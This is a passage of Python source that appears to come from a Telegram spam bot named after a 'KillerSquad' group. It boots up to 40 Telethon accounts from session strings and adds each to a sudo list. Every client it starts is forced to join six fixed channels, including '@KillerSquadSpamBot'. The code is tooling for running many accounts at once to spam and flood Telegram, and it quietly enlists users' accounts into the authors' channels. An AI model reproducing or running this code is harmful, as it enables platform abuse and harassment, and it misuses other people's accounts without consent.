            await KILL28(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL28(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL28(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL28(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL28(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL28(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botme = await KILL28.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 28 not Found")
        pass
        session_name = ""
        KILL28 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL28.start()
        except Exception as e:
            pass   
        
    if STRING29:
        session_name = str(STRING29)
        print("String 29 Found")
        KILL29 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 29")
            await KILL29.start()
            await KILL29(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL29(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL29(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL29(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL29(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL29(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botme = await KILL29.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 29 not Found")
        pass
        session_name = ""
        KILL29 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL29.start()
        except Exception as e:
            pass   
    
  
    if STRING30:
        session_name = str(STRING30)
        print("String 30 Found")
        KILL30 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 30")
            await KILL30.start()
            await KILL30(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL30(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL30(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL30(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL30(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL30(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botme = await KILL30.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 30 not Found")
        pass
        session_name = ""
        KILL30 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL30.start()
        except Exception as e:
            pass 
        
    
    if STRING31:
        session_name = str(STRING31)
        print("String 31 Found")
        KILL31 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 31")
            await KILL31.start()
            await KILL31(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL31(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL31(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL31(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL31(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL31(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botme = await KILL31.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 31 not Found")
        pass
        session_name = ""
        KILL31 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL31.start()
        except Exception as e:
            pass
        
    
    if STRING32:
        session_name = str(STRING32)
        print("String 32 Found")
        KILL32 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 32")
            await KILL32.start()
            await KILL32(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL32(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL32(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL32(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL32(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL32(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botme = await KILL32.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 32 not Found")
        pass
        session_name = ""
        KILL32 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL32.start()
        except Exception as e:
            pass   
    
  
    if STRING33:
        session_name = str(STRING33)
        print("String 33  Found")
        KILL33 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 33")
            await KILL33.start()
            await KILL33(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL33(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL33(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL33(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL33(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL33(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botme = await KILL33.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 33 not Found")
        pass
        session_name = ""
        KILL33 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL33.start()
        except Exception as e:
            pass 
        
    
    if STRING34:
        session_name = str(STRING34)
        print("String 34 Found")
        KILL34 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 34")
            await KILL34.start()
            await KILL34(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL34(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL34(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL34(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL34(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL34(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botme = await KILL34.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 34 not Found")
        pass
        session_name = ""
        KILL34 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL34.start()
        except Exception as e:
            pass
        
    
    if STRING35:
        session_name = str(STRING35)
        print("String 35 Found")
        KILL35 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 35")
            await KILL35.start()
            await KILL35(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL35(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL35(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL35(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL35(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL35(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botme = await KILL35.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 35 not Found")
        pass
        session_name = ""
        KILL35 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL35.start()
        except Exception as e:
            pass


    if STRING36:
        session_name = str(STRING36)
        print("String 36 Found")
        KILL36 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 36")
            await KILL36.start()
            botme = await KILL36.get_me()
            await KILL36(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL36(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL36(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL36(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL36(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL36(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 36 not Found")
        session_name = ""
        KILL36 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL36.start()
        except Exception as e:
            pass
   
    if STRING37:
        session_name = str(STRING37)
        print("String 37 Found")
        KILL37 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 37")
            await KILL37.start()
            botme = await KILL37.get_me()
            await KILL37(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL37(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL37(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL37(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL37(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL37(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 37 not Found")
        session_name = ""
        KILL37 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL37.start()
        except Exception as e:
            pass
   
    if STRING38:
        session_name = str(STRING38)
        print("String 38 Found")
        KILL38 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 38")
            await KILL38.start()
            botme = await KILL38.get_me()
            await KILL38(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL38(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL38(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL38(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL38(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL38(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 38 not Found")
        session_name = ""
        KILL38 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL38.start()
        except Exception as e:
            pass
   
    if STRING39:
        session_name = str(STRING39)
        print("String 39 Found")
        KILL39 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 39")
            await KILL39.start()
            botme = await KILL39.get_me()
            await KILL39(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL39(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL39(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL39(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL39(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL39(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 39 not Found")
        session_name = ""
        KILL39 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL39.start()
        except Exception as e:
            pass
   
    if STRING40:
        session_name = str(STRING40)
        print("String 40 Found")
        KILL40 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 40")
            await KILL40.start()
            botme = await KILL40.get_me()
            await KILL40(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL40(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL40(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL40(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL40(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL40(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 40 not Found")
        session_name = ""
        KILL40 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL40.start()
        except Exception as e:
            pass

loop = asyncio.get_event_loop()
loop.run_until_complete(KILLERSPAM())
